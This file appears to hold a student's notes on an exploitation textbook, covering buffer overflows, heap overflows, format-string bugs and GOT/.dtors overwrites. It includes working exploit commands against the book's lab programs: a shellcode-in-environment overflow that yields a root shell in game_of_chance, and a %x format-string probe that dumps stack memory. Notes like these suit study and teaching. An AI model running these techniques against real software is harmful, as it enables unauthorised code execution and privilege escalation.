@@ -1,0 +1,128 @@
+pg. 115 - 194
+
+
+Common Error:
+	off-by-one error / fencepost error
+		programmer has miscounted by one.
+ LaMacchia Loophole:
+	Used to skirt out of legal trouble, due to the laws at the time saying that copyright laws only where applicable if they were trying to obtain something in return for it. LaMacchia simple did it for no reason other than to share, so the laws couldn't prosecute him 
+	
+Using perl as in-line fuzzing :
+	./overflow_example $(perl -e 'print "A"x30') 	./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+	./overflow_example $(perl -e 'print "A"x20 . "ABCD"')	./overflow_example AAAAAAAAAAAAAAAAAAAAAABCD
+	
+Using Bash for fuzzing:
+	reader@hacking:~/booksrc $ for i in $(seq 1 3 10)
+	> do
+	> echo The value is $i
+	> done
+	The value is 1
+	The value is 4
+	The value is 7
+	The value is 10
+
+
+0x320: Buffer Overflows / Buffer Overrun:
+	Ex. Putting 10 bytes into a space only allocated for 8 bytes
+	
+0x349: Overflows in other segments:
+	Buffer Overflow, but located in other memory segments.
+		Ex. Heap and BSS.
+	If program gives you the buffer, you can do some simple bath to figure out how much the max amount of data is allowed to be stored in the buffers
+		ex. gdb -q 
+		(gdb) p 0x804a070 - 0x804a008  
+			$1 = 104
+		This allows you to start fuzzing, seeing if 104 bytes put into the first buffer will push over to the next buffer.
+	If successful, you can potentially change the address data to something more intresting. 
+	since glibc 2.2.5, unlinking is hard to do, but if its called before the free() func is called, it can still happen.
+	
+	Game_of_chance.C Example:
+		gdb -q ./a.out
+			(gdb) break main
+			(gdb) run
+			(gdb) p player
+			(gdb) x/x &player.name 	Gets the location of the player.name var
+			(gdb) x/x &player.current_game	Gets the location of the current_game var
+			(Gdb) p 0x804b6d0 - 0x804b66c	Gets the difference between both vals from above
+			(gdb) quit	
+			
+		Now that you know the length, you can fuzz to see if the program crashes. If it does, then you know you can change the pointers value.
+	
+	Command NM:
+		Used for list symbols in an object file. Can be used to find addresses of functions of programs.
+	
+	Can use local vars (linux) to create a payload for a root shell
+	ex.
+		export SHELLCODE=$(cat ./shellcode.bin)
+		./getenvaddr SHELLCODE ./game_of_chanse
+			shellcode will be at 0xbffff9e0
+		perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\xe0\xf9\xff\xbf\n" . "1\n"' > exploit_buffer
+		cat exploit_buffer - | ./game_of_chance
+
+
+
+
+0x350: Format Strings
+	Similar to bof, as it depends on programmers mistakes.
+		Parameter	Input Type	Output Type
+		%d	Value	Decimal
+		%u	Value	Unsigned Decimal
+		%x 	Value	Hexadecimal
+		%s	Pointer	String
+		%n	Pointer	Number of Bytes written so far
+		
+		%n is unique in that it writes data without displaying anything. When called it writes the number of bytest hat have been written by the function to the address 
+		
+	The Format String Vulnerability:
+		using printf(string) instead of printf("%s", string) to print strings.
+		
+		The first way will cause un-expecting results if you send over crafted input
+		ex.
+			testing %x
+				testing%x
+				testingbffff3e0
+			When %x was used, the hex representation of a four-byte word in the stack was printed. This can be used repeatedly to examine stack_memory.
+				./fmt_vuln $(perl -e 'print "%08x."x40')
+					[outputs 40 different lower stack memory addresses]
+	
+	Reading From arbitrary memory addresses:
+		%s can be used to read from arbitrary memory addresses. part of the original string can be used to supply an address to the %s format parameter.
+	
+	Writing to Arbitrary Memory Addresses:
+		%s can be used to read addresses, so %n should be able to write to those addresses too.
+		Depends on the number of bytes written before the %n. Can be controlled by manipulating the field width option.
+		Easy to write to the %n byte counter, but its impossible to subtract from it. 
+		Instead of subtracting, you can wrap around to set the least significant byte 
+		If you are off by say 2 bytes and you can only write at 4/8 a time, you might just have to wrap around again until you have control of all 4 bytes
+		
+		
+	Direct  Parameter Access:
+		Way to simplify format string exploits. 
+		Allows parameters to be accessed directly by using the dollar sign qualifer instead of having to use several %x format parametrs to step though.
+			ex. %n $d would access the nth parameter and display it as a decimal number
+			printf("7th: %7$d, 4th: %4$05d \n", 10, 20, 30, 40, 50, 60, 70, 80);
+				7th: 70, 4th: 0004
+		%7$d will pull the 7th parameter and display it as a decimal
+
+0x356:
+	Short: Typically a two-byte word, and format parameters have a special way of dealing with them.
+
+Binary programs copiled with the GNU C compiler, specital tables are called:
+	.dtors : Destructors
+		Executed just before the main() function is exeits with an exit system call.
+	.ctors : constructors
+		Executed before the main() function is executed
+	
+	Destructors can be set up as a static void with the destructor appended to the end. Once main is finished, it will then call that function
+		Controlled by the .dtors table section of the binary.
+			an array of 32-bit address terminated by a null address.
+			Array always begins with 0xffffffff and ends with 0x00000000. Between those two are the addresses of all the function that have been declared with the destructor attribute.
+			
+Overwriting the Global Offset Table:
+	Procedure Linkage Table (PLT):
+		Consits of many jump instructions, each one relating to the address of a function. 
+	Global Offset Table (GOT):
+		address from PLT may actually be here, which could be writable.
+		Fixed binary, allowing different systems with the same binary 
+Any section of memory that is writable and contains an address that directs the flow of a program execution can be targeted.
+
